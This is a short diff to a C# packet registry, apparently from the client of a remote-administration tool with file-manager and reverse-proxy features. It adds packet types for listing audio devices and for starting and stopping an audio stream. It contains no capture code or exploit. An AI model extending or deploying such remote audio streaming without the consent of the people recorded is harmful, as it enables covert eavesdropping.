@@ -57,6 +57,9 @@ namespace xClient.Core.Packets
                 typeof (Packets.ServerPackets.SetAuthenticationSuccess),
                 typeof (Packets.ServerPackets.GetConnections),
                 typeof (Packets.ServerPackets.DoCloseConnection),
+                typeof (Packets.ServerPackets.GetAudioDevices),
+                typeof (Packets.ServerPackets.GetAudioStream),
+                typeof (Packets.ServerPackets.StopAudioStream),
                 typeof (Packets.ClientPackets.GetAuthenticationResponse),
                 typeof (Packets.ClientPackets.SetStatus),
                 typeof (Packets.ClientPackets.SetStatusFileManager),
@@ -86,8 +89,10 @@ namespace xClient.Core.Packets
                 typeof (ReverseProxy.Packets.ReverseProxyConnectResponse),
                 typeof (ReverseProxy.Packets.ReverseProxyData),
                 typeof (ReverseProxy.Packets.ReverseProxyDisconnect),
-                typeof (Packets.ClientPackets.GetConnectionsResponse)
-
+                typeof (Packets.ClientPackets.GetConnectionsResponse),
+                typeof (Packets.ClientPackets.GetAudioDevicesResponse),
+                typeof (Packets.ClientPackets.GetAudioStreamResponse),
+                typeof (Packets.ClientPackets.StopAudioStreamResponse),
             };
         }
     }
